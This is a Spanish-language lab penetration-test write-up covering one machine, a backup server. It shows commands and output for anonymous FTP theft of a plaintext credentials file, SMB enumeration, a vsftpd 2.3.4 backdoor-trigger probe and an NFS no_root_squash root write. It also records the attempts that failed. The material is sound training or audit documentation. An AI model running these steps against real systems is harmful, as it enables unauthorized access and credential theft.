# Fase 4.2 · M3 · Servidor de respaldos

**Objetivo:** acceder a los respaldos, obtener credenciales y demostrar escritura como root.
**Ejecuta:** M6 → M3 `10.10.10.13` (FTP/SMB directos; NFS desde M1).
**Fecha UTC:** 2026-10-24.

---

## 4.2.1 Comandos demo (simples)

| # | Comando | Qué muestra |
|---|---|---|
| 1 | `curl -s ftp://anonymous:anonymous@10.10.10.13/backups/` | Listado de backups |
| 2 | `curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt` | Clave de M4/M5 |
| 3 | `smbclient -L //10.10.10.13 -N` | Recurso `backups` |
| 4 | `showmount -e 10.10.10.13` (desde M1) | Exportación NFS |
| 5 | Montar `/srv/storage/backups` desde M1 y `touch` | `no_root_squash` |

---

## 4.2.2 B3 · FTP anónimo y credenciales en claro — validado

```bash
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/
curl -s ftp://anonymous:anonymous@10.10.10.13/backups/credenciales.txt
```

**Salida real** (`F04-002`):

```text
== listado ==
-rw-r--r--    1 34       34             23 Oct 24 15:52 credenciales.txt
-rw-r--r--    1 34       34         170974 Oct 24 15:52 moodle_db-2026-10-24.sql.gz
-rw-r--r--    1 34       34            131 Oct 24 15:53 redis-2026-10-24.rdb.gz
-rw-r--r--    1 34       34          21158 Oct 24 15:52 wordpress-2026-10-24.sql.gz
== credenciales.txt ==
admin M4/M5: Admin13.-
```

**Interpretación:** el FTP anónimo entrega los respaldos y el archivo `credenciales.txt` con la clave **`Admin13.-`**, reutilizada en M4 y M5. Es el eslabón M3 → M4/M5.

---

## 4.2.3 B1 · Samba 4.5.10 — enumeración y limitación

```bash
smbclient -L //10.10.10.13 -N
```

**Salida real** (`F04-005`):

```text
	Sharename       Type      Comment
	---------       ----      -------
	backups         Disk
	IPC$            IPC       IPC Service (Servidor de respaldos USC)

	Workgroup            Master
	---------            -------
	USCLAB               BKP01
```

**Interpretación:** el recurso `backups` es visible y el servidor habla SMB1. Sin embargo, **Samba 4.5.10 es la versión que corrige CVE-2017-7494** (SambaCry); por eso **B1 no es explotable tal como está**. Se documenta la versión y la limitación. Para que B1 fuera real habría que compilar 4.5.9 o 4.4.13.

---

## 4.2.4 B2 · vsftpd 2.3.4 — backdoor no presente

```bash
printf 'USER x:)\r\nPASS x\r\n' | nc 10.10.10.13 21
nc -zv 10.10.10.13 6200
```

**Salida real** (manual, 2026-10-24):

```text
220 (vsFTPd 2.3.4)
530 This FTP server is anonymous only.
503 Login with USER first.
```

`nc -zv 10.10.10.13 6200` no obtuvo conexión (timeout). **El backdoor no está presente**: el binario se compiló de un tarball limpio y el servidor está en modo solo anónimo. Se documenta la limitación; B2 no se usa en la cadena.

---

## 4.2.5 B4 · NFS `no_root_squash` — validado

Desde M1 (que sí puede acceder a NFS):

```bash
sudo mkdir -p /mnt/backups-test
sudo mount -t nfs -o vers=4.2,soft,timeo=10 10.10.10.13:/srv/storage/backups /mnt/backups-test
sudo touch /mnt/backups-test/ROOT_FUE_AQUI.txt
ls -l /mnt/backups-test/ROOT_FUE_AQUI.txt
```

**Salida real** (`F04-006`):

```text
-rw-r--r-- 1 root root 0 oct 24 16:48 /mnt/backups-test/ROOT_FUE_AQUI.txt
```

**Interpretación:** el archivo creado desde M1 aparece como **propiedad de `root`** en M3. Eso demuestra `no_root_squash`: un root remoto escribe como root en la exportación. El archivo se eliminó y se desmontó en la misma sesión para no dejar basura.

**Evidencia:** `F04-006.png` · `F04-006.log`.

---

## 4.2.6 Resultado

| ID | Estado | Evidencia |
|---|---|---|
| B1 SambaCry | ❌ No explotable (4.5.10 = fix) | `F04-005` |
| B2 vsftpd backdoor | ❌ No presente (`:6200` cerrado) | salida manual |
| B3 FTP anónimo + credenciales | ✅ Validado | `F04-002` |
| B4 NFS `no_root_squash` | ✅ Validado | `F04-006` |

**Cierre:** M3 comprometido por B3/B4. La clave `Admin13.-` habilita M4 y M5. B1/B2 se documentan como limitaciones reales, no como éxitos inventados.

---

## 4.2.7 Evidencia

| ID | Archivo | Qué demuestra |
|---|---|---|
| F04-002 | `evidencias/png/F04-002.png` | FTP anónimo + `credenciales.txt` |
| F04-005 | `evidencias/png/F04-005.png` | Shares SMB `backups`/`IPC$` |
| F04-006 | `evidencias/png/F04-006.png` | Archivo root vía NFS `no_root_squash` |
